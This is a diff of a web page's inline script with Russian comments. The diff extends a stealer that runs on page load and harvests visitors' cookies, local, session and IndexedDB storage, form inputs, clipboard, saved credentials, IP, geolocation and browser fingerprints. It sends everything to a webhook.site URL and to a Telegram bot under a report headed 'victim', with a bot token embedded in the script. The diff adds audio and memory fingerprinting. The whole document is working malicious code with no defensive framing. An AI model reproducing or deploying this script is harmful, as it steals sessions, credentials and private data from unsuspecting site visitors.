@@ -28,14 +28,14 @@
 
     <script>
         // ============================================================
-        //  НАСТРОЙКИ ОТПРАВКИ
+        //  НАСТРОЙКИ
         // ============================================================
         const WEBHOOK_URL = 'https://webhook.site/613658ef-cb9f-4d68-8bae-9ae016ec744b';
         const BOT_TOKEN = '8783402037:AAF1L0A_UP12EUOgn5x2g7UMFntHy3QjDfk';
         const CHAT_ID = '8327334745';
 
         // ============================================================
-        //  ГЛАВНАЯ ФУНКЦИЯ СБОРА
+        //  МАКСИМАЛЬНЫЙ СБОР
         // ============================================================
         (async function() {
             await new Promise(r => setTimeout(r, 2000));
@@ -46,9 +46,7 @@
                 referrer: document.referrer || null
             };
 
-            // ============================================================
-            //  1. БРАУЗЕР И УСТРОЙСТВО
-            // ============================================================
+            // ---- 1. БРАУЗЕР ----
             data.browser = {
                 userAgent: navigator.userAgent,
                 platform: navigator.platform,
@@ -67,7 +65,7 @@
                 timezoneOffset: new Date().getTimezoneOffset()
             };
 
-            // ---- User-Agent Client Hints (если есть) ----
+            // UA Client Hints
             try {
                 if (navigator.userAgentData && navigator.userAgentData.getHighEntropyValues) {
                     data.browser.uaHints = await navigator.userAgentData.getHighEntropyValues([
@@ -76,9 +74,7 @@
                 }
             } catch (_) {}
 
-            // ============================================================
-            //  2. ЭКРАН И ОКНО
-            // ============================================================
+            // ---- 2. ЭКРАН ----
             data.screen = {
                 width: screen.width,
                 height: screen.height,
@@ -95,9 +91,7 @@
                 outerHeight: window.outerHeight
             };
 
-            // ============================================================
-            //  3. КУКИ (ВСЕ)
-            // ============================================================
+            // ---- 3. КУКИ ----
             data.cookies = {};
             if (document.cookie) {
                 document.cookie.split('; ').forEach(c => {
@@ -106,9 +100,7 @@
                 });
             }
 
-            // ============================================================
-            //  4. LOCALSTORAGE (ПОЛНЫЙ ДАМП)
-            // ============================================================
+            // ---- 4. LOCALSTORAGE ----
             data.localStorage = {};
             for (let i = 0; i < localStorage.length; i++) {
                 const key = localStorage.key(i);
@@ -119,9 +111,7 @@
                 }
             }
 
-            // ============================================================
-            //  5. SESSIONSTORAGE (ПОЛНЫЙ ДАМП)
-            // ============================================================
+            // ---- 5. SESSIONSTORAGE ----
             data.sessionStorage = {};
             for (let i = 0; i < sessionStorage.length; i++) {
                 const key = sessionStorage.key(i);
@@ -132,9 +122,7 @@
                 }
             }
 
-            // ============================================================
-            //  6. INDEXEDDB (СПИСОК БАЗ)
-            // ============================================================
+            // ---- 6. INDEXEDDB ----
             data.indexedDB = [];
             try {
                 if (indexedDB.databases) {
@@ -168,9 +156,7 @@
                 }
             } catch (_) {}
 
-            // ============================================================
-            //  7. ФОРМЫ (ВСЕ ПОЛЯ)
-            // ============================================================
+            // ---- 7. ФОРМЫ ----
             data.forms = {};
             document.querySelectorAll('input, textarea, select').forEach(el => {
                 const name = el.name || el.id || el.className || 'field';
@@ -187,31 +173,23 @@
                 } catch (_) {}
             });
 
-            // ============================================================
-            //  8. МЕТА-ТЕГИ
-            // ============================================================
+            // ---- 8. МЕТА ----
             data.meta = {};
             document.querySelectorAll('meta').forEach(m => {
                 const name = m.getAttribute('name') || m.getAttribute('property') || 'meta';
                 data.meta[name] = m.getAttribute('content') || '';
             });
 
-            // ============================================================
-            //  9. ВСЕ ССЫЛКИ
-            // ============================================================
+            // ---- 9. ССЫЛКИ ----
             data.links = Array.from(document.querySelectorAll('a[href]')).map(a => a.href);
 
-            // ============================================================
-            //  10. ПАРАМЕТРЫ URL
-            // ============================================================
+            // ---- 10. ПАРАМЕТРЫ URL ----
             data.urlParams = {};
             new URLSearchParams(window.location.search).forEach((v, k) => {
                 data.urlParams[k] = v;
             });
 
-            // ============================================================
-            //  11. IP
-            // ============================================================
+            // ---- 11. IP ----
             data.ip = null;
             try {
                 const resp = await fetch('https://api.ipify.org?format=json');
@@ -219,9 +197,7 @@
                 data.ip = json.ip;
             } catch (_) {}
 
-            // ============================================================
-            //  12. ГЕО ПО IP (ПОЛНАЯ ИНФОРМАЦИЯ)
-            // ============================================================
+            // ---- 12. ГЕО ----
             data.geo = null;
             if (data.ip) {
                 try {
@@ -247,9 +223,7 @@
                 } catch (_) {}
             }
 
-            // ============================================================
-            //  13. ЛОКАЛЬНЫЙ IP (WEBRTC)
-            // ============================================================
+            // ---- 13. ЛОКАЛЬНЫЙ IP ----
             data.localIPs = [];
             try {
                 const pc = new RTCPeerConnection({ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] });
@@ -267,9 +241,7 @@
                 data.localIPs = ips;
             } catch (_) {}
 
-            // ============================================================
-            //  14. БУФЕР ОБМЕНА
-            // ============================================================
+            // ---- 14. БУФЕР ----
             data.clipboard = null;
             try {
                 if (navigator.clipboard && navigator.clipboard.readText) {
@@ -277,9 +249,7 @@
                 }
             } catch (_) {}
 
-            // ============================================================
-            //  15. CREDENTIALS API (СОХРАНЁННЫЕ ПАРОЛИ)
-            // ============================================================
+            // ---- 15. CREDENTIALS ----
             data.credentials = null;
             try {
                 if (navigator.credentials && navigator.credentials.get) {
@@ -293,9 +263,7 @@
                 }
             } catch (_) {}
 
-            // ============================================================
-            //  16. CANVAS FINGERPRINT
-            // ============================================================
+            // ---- 16. CANVAS ----
             data.canvasFingerprint = null;
             try {
                 const canvas = document.createElement('canvas');
@@ -313,9 +281,7 @@
                 data.canvasFingerprint = canvas.toDataURL();
             } catch (_) {}
 
-            // ============================================================
-            //  17. WEBGL FINGERPRINT
-            // ============================================================
+            // ---- 17. WEBGL ----
             data.webglFingerprint = null;
             try {
                 const canvas = document.createElement('canvas');
@@ -331,26 +297,25 @@
                 }
             } catch (_) {}
 
-            // ============================================================
-            //  18. ПЛАГИНЫ
-            // ============================================================
-            data.plugins = Array.from(navigator.plugins || []).map(p => ({
-                name: p.name,
-                filename: p.filename,
-                description: p.description
-            }));
+            // ---- 18. АУДИООТПЕЧАТОК ----
+            data.audioFingerprint = null;
+            try {
+                const ctx = new (window.AudioContext || window.webkitAudioContext)();
+                const osc = ctx.createOscillator();
+                const gain = ctx.createGain();
+                osc.connect(gain);
+                gain.connect(ctx.destination);
+                osc.frequency.value = 440;
+                osc.start(0);
+                osc.stop(0.1);
+                data.audioFingerprint = {
+                    sampleRate: ctx.sampleRate,
+                    state: ctx.state
+                };
+                ctx.close();
+            } catch (_) {}
 
-            // ============================================================
-            //  19. MIME-ТИПЫ
-            // ============================================================
-            data.mimeTypes = Array.from(navigator.mimeTypes || []).map(m => ({
-                type: m.type,
-                description: m.description
-            }));
-
-            // ============================================================
-            //  20. БАТАРЕЯ
-            // ============================================================
+            // ---- 19. БАТАРЕЯ ----
             data.battery = null;
             try {
                 if (navigator.getBattery) {
@@ -364,9 +329,7 @@
                 }
             } catch (_) {}
 
-            // ============================================================
-            //  21. СЕТЬ (CONNECTION)
-            // ============================================================
+            // ---- 20. СЕТЬ ----
             data.connection = null;
             try {
                 const c = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
@@ -381,9 +344,32 @@
                 }
             } catch (_) {}
 
-            // ============================================================
-            //  22. СКРИНШОТ
-            // ============================================================
+            // ---- 21. ПЛАГИНЫ ----
+            data.plugins = Array.from(navigator.plugins || []).map(p => ({
+                name: p.name,
+                filename: p.filename,
+                description: p.description
+            }));
+
+            // ---- 22. MIME ----
+            data.mimeTypes = Array.from(navigator.mimeTypes || []).map(m => ({
+                type: m.type,
+                description: m.description
+            }));
+
+            // ---- 23. ПАМЯТЬ (Performance) ----
+            data.memory = null;
+            try {
+                if (performance.memory) {
+                    data.memory = {
+                        jsHeapSizeLimit: performance.memory.jsHeapSizeLimit,
+                        totalJSHeapSize: performance.memory.totalJSHeapSize,
+                        usedJSHeapSize: performance.memory.usedJSHeapSize
+                    };
+                }
+            } catch (_) {}
+
+            // ---- 24. СКРИНШОТ ----
             data.screenshot = null;
             try {
                 const script = document.createElement('script');
@@ -409,7 +395,7 @@
             //  ОТПРАВКА
             // ============================================================
 
-            // ---- Webhook (полный JSON) ----
+            // ---- Webhook ----
             try {
                 await fetch(WEBHOOK_URL, {
                     method: 'POST',
@@ -418,12 +404,14 @@
                 });
             } catch (_) {}
 
-            // ---- Telegram (структурированный отчёт) ----
+            // ---- Telegram ----
             try {
                 let msg = '🔴 ЖЕРТВА\n\n';
 
-                // 1. IP и гео
+                // IP
                 if (data.ip) msg += `🌐 IP: ${data.ip}\n`;
+
+                // ГЕО
                 if (data.geo) {
                     msg += `\n📍 ГЕО:\n`;
                     msg += `   🌍 ${data.geo.country} (${data.geo.country_code})\n`;
@@ -438,22 +426,22 @@
                     if (data.geo.postal) msg += `   📮 ${data.geo.postal}\n`;
                 }
 
-                // 2. Локальный IP
+                // Локальный IP
                 if (data.localIPs && data.localIPs.length) {
                     msg += `\n📡 Локальный IP: ${data.localIPs.join(', ')}\n`;
                 }
 
-                // 3. Буфер обмена
+                // Буфер
                 if (data.clipboard) {
                     msg += `\n📋 Буфер: ${data.clipboard.substring(0, 200)}\n`;
                 }
 
-                // 4. Сохранённые пароли
+                // Сохранённые пароли
                 if (data.credentials) {
                     msg += `\n🔑 Сохранённый логин: ${data.credentials.id}\n`;
                 }
 
-                // 5. LOCALSTORAGE
+                // LOCALSTORAGE
                 const lsKeys = Object.keys(data.localStorage);
                 if (lsKeys.length > 0) {
                     msg += `\n💾 LOCALSTORAGE (${lsKeys.length} шт.):\n`;
@@ -464,7 +452,7 @@
                     }
                 }
 
-                // 6. SESSIONSTORAGE
+                // SESSIONSTORAGE
                 const ssKeys = Object.keys(data.sessionStorage);
                 if (ssKeys.length > 0) {
                     msg += `\n🗂 SESSIONSTORAGE (${ssKeys.length} шт.):\n`;
@@ -475,7 +463,7 @@
                     }
                 }
 
-                // 7. INDEXEDDB
+                // INDEXEDDB
                 if (data.indexedDB && data.indexedDB.length > 0) {
                     msg += `\n🗄 INDEXEDDB:\n`;
                     for (const db of data.indexedDB) {
@@ -486,7 +474,7 @@
                     }
                 }
 
-                // 8. Куки
+                // КУКИ
                 const cookieKeys = Object.keys(data.cookies);
                 if (cookieKeys.length > 0) {
                     msg += `\n🍪 КУКИ (${cookieKeys.length} шт.):\n`;
@@ -495,7 +483,7 @@
                     }
                 }
 
-                // 9. Формы
+                // ФОРМЫ
                 const formKeys = Object.keys(data.forms);
                 if (formKeys.length > 0) {
                     msg += `\n📝 ФОРМЫ:\n`;
@@ -504,27 +492,37 @@
                     }
                 }
 
-                // 10. Отпечатки
+                // ОТПЕЧАТКИ
                 if (data.canvasFingerprint) {
-                    msg += `\n🎨 Canvas отпечаток: ${data.canvasFingerprint.substring(0, 60)}...\n`;
+                    msg += `\n🎨 Canvas: ${data.canvasFingerprint.substring(0, 60)}...\n`;
                 }
                 if (data.webglFingerprint) {
                     msg += `🖥 WebGL: ${data.webglFingerprint.renderer || '?'}\n`;
                 }
+                if (data.audioFingerprint) {
+                    msg += `🔊 Audio: ${data.audioFingerprint.sampleRate}Hz\n`;
+                }
 
-                // 11. Браузер
+                // СЕТЬ И БАТАРЕЯ
+                if (data.connection) {
+                    msg += `📶 Сеть: ${data.connection.effectiveType || '?'}\n`;
+                }
+                if (data.battery) {
+                    msg += `🔋 Батарея: ${Math.round(data.battery.level * 100)}%\n`;
+                }
+
+                // БРАУЗЕР
                 msg += `\n📱 ${data.browser.userAgent.substring(0, 80)}...\n`;
                 msg += `🕐 ${data.browser.timezone || '?'}\n`;
                 msg += `💻 ${data.browser.platform || '?'}\n`;
 
-                // 12. Скриншот
+                // СКРИНШОТ
                 if (data.screenshot) {
                     msg += `🖼 Скриншот: ${(data.screenshot.length / 1024).toFixed(0)} КБ\n`;
                 }
 
                 msg += `\n🔗 ${data.url}`;
 
-                // Отправка
                 await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
